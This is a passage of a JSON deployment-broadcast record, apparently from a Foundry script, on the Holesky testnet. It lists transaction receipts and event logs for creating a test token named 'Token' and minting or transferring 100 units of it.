          "topics": [
            "0xbe89fbc5edbebf243cf8cf7946ce755357087079003d51a4eb7c69e987bf0801",
            "0x0000000000000000000000000000000000000000000000000000000000000002",
            "0x000000000000000000000000e79206ea5f8ed1a5281a812d8864f5b3207c9441",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000e49039c90200000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005546f6b656e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003546f6b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
          "blockNumber": "0x2d5101",
          "blockTimestamp": "0x676469c4",
          "transactionHash": "0x82c227bf8fe8c6738d493b704584d4b8a90889fbcb71a4162eb960dfedf3a91e",
          "transactionIndex": "0xd",
          "logIndex": "0x1e",
          "removed": false
        },
        {
          "address": "0xf7336fd84911203f1f01ab6803eccc984700f591",
          "topics": [
            "0x4641df4a962071e12719d8c8c8e5ac7fc4d97b927346a3d7a335b1f7517e133c",
            "0xdb119220d3e095dcf5fffe9f6de2fcd1f5ed39bf955d6009700cfc0cd9fcefb5"
          ],
          "data": "0x",
          "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
          "blockNumber": "0x2d5101",
          "blockTimestamp": "0x676469c4",
          "transactionHash": "0x82c227bf8fe8c6738d493b704584d4b8a90889fbcb71a4162eb960dfedf3a91e",
          "transactionIndex": "0xd",
          "logIndex": "0x1f",
          "removed": false
        },
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0xbf51f33e028e024c2ee9fa166c62c4684a641601ad85aa3670ed506cc0fa0ca3",
            "0x00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43"
          ],
          "data": "0x000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000005546f6b656e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003546f6b0000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
          "blockNumber": "0x2d5101",
          "blockTimestamp": "0x676469c4",
          "transactionHash": "0x82c227bf8fe8c6738d493b704584d4b8a90889fbcb71a4162eb960dfedf3a91e",
          "transactionIndex": "0xd",
          "logIndex": "0x20",
          "removed": false
        },
        {
          "address": "0xf7336fd84911203f1f01ab6803eccc984700f591",
          "topics": [
            "0xbe89fbc5edbebf243cf8cf7946ce755357087079003d51a4eb7c69e987bf0801",
            "0x0000000000000000000000000000000000000000000000000000000000000002",
            "0x000000000000000000000000e79206ea5f8ed1a5281a812d8864f5b3207c9441",
            "0x000000000000000000000000f7336fd84911203f1f01ab6803eccc984700f591"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000648a9d3fcf00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
          "blockNumber": "0x2d5101",
          "blockTimestamp": "0x676469c4",
          "transactionHash": "0x82c227bf8fe8c6738d493b704584d4b8a90889fbcb71a4162eb960dfedf3a91e",
          "transactionIndex": "0xd",
          "logIndex": "0x21",
          "removed": false
        },
        {
          "address": "0xf7336fd84911203f1f01ab6803eccc984700f591",
          "topics": [
            "0x4641df4a962071e12719d8c8c8e5ac7fc4d97b927346a3d7a335b1f7517e133c",
            "0x736d29cadbeb5acde69f5b53e23f0138af0872e0880390aa4c3185679e089527"
          ],
          "data": "0x",
          "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
          "blockNumber": "0x2d5101",
          "blockTimestamp": "0x676469c4",
          "transactionHash": "0x82c227bf8fe8c6738d493b704584d4b8a90889fbcb71a4162eb960dfedf3a91e",
          "transactionIndex": "0xd",
          "logIndex": "0x22",
          "removed": false
        },
        {
          "address": "0xe79206ea5f8ed1a5281a812d8864f5b3207c9441",
          "topics": [
            "0x44b4f910eed5395f84d00285781e37020302f8ae9b632209b4c3eafe05bd2e87",
            "0x00000000000000000000000056dd51c27325f54b7d3d4c468a16560981380a43",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000064",
          "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
          "blockNumber": "0x2d5101",
          "blockTimestamp": "0x676469c4",
          "transactionHash": "0x82c227bf8fe8c6738d493b704584d4b8a90889fbcb71a4162eb960dfedf3a91e",
          "transactionIndex": "0xd",
          "logIndex": "0x23",
          "removed": false
        },
        {
          "address": "0xf35110f68f441fd3bd7d354a2a5faa1d32b970a7",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000000000000000000000000000000000000000000000",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000064",
          "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
          "blockNumber": "0x2d5101",
          "blockTimestamp": "0x676469c4",
          "transactionHash": "0x82c227bf8fe8c6738d493b704584d4b8a90889fbcb71a4162eb960dfedf3a91e",
          "transactionIndex": "0xd",
          "logIndex": "0x24",
          "removed": false
        }
      ],
      "logsBloom": "0x04000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000a00000140000000000000010008008000000000000000000000000000000100000000000020000020000401000000080400801000000400000000000008018000000000008000000200000000400000000020400008002000000000000000080004000022000000100000000008100000000000040008000000000000010000000000000001002000000400000000000000020000000000000000000002000000020002810000004000000000000000000000002000000008000020000000008200008",
      "type": "0x2",
      "transactionHash": "0x82c227bf8fe8c6738d493b704584d4b8a90889fbcb71a4162eb960dfedf3a91e",
      "transactionIndex": "0xd",
      "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
      "blockNumber": "0x2d5101",
      "gasUsed": "0x113b1e",
      "effectiveGasPrice": "0xe4e1cc",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0xf7336fd84911203f1f01ab6803eccc984700f591",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x2e8fa0",
      "logs": [
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987",
            "0x0000000000000000000000004925816f693eeb2cb0de446742e5d9cd20b9c5dc",
            "0x0000000000000000000000004925816f693eeb2cb0de446742e5d9cd20b9c5dc",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x00000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
          "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
          "blockNumber": "0x2d5101",
          "blockTimestamp": "0x676469c4",
          "transactionHash": "0x076f01679470a31a40e1b4f1a16c91757375787507091cca702471e158322c45",
          "transactionIndex": "0xe",
          "logIndex": "0x25",
          "removed": false
        },
        {
          "address": "0x56dd51c27325f54b7d3d4c468a16560981380a43",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x0000000000000000000000004925816f693eeb2cb0de446742e5d9cd20b9c5dc",
            "0x000000000000000000000000e88150c42cc6c0294dd20893bf5b1ec6edd24fc6"
          ],
          "data": "0x0000000000000000000000000000000000000000000000000000000000000064",
          "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
          "blockNumber": "0x2d5101",
          "blockTimestamp": "0x676469c4",
          "transactionHash": "0x076f01679470a31a40e1b4f1a16c91757375787507091cca702471e158322c45",
          "transactionIndex": "0xe",
          "logIndex": "0x26",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000100000000000000000000000000000000000000000000000000000000000000000000000400000000000000010000000000000000000000000000000000000000000000002000000000000000080000000000000000100000000000000000000000000000000000000000010000000000000001002000000000000000000000000000000000000000000002000000000000000000004000000000000000000000000000000000000022000000000000000",
      "type": "0x2",
      "transactionHash": "0x076f01679470a31a40e1b4f1a16c91757375787507091cca702471e158322c45",
      "transactionIndex": "0xe",
      "blockHash": "0x7303ca8f00aa277e8e814225b068f0b5cfdbfdeb275d4a174029b99b8add1ce4",
      "blockNumber": "0x2d5101",
      "gasUsed": "0xc627",
      "effectiveGasPrice": "0xe4e1cc",
      "from": "0xe88150c42cc6c0294dd20893bf5b1ec6edd24fc6",
      "to": "0x4925816f693eeb2cb0de446742e5d9cd20b9c5dc",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1734633927,
  "chain": 17000,
  "commit": "58111ea"
}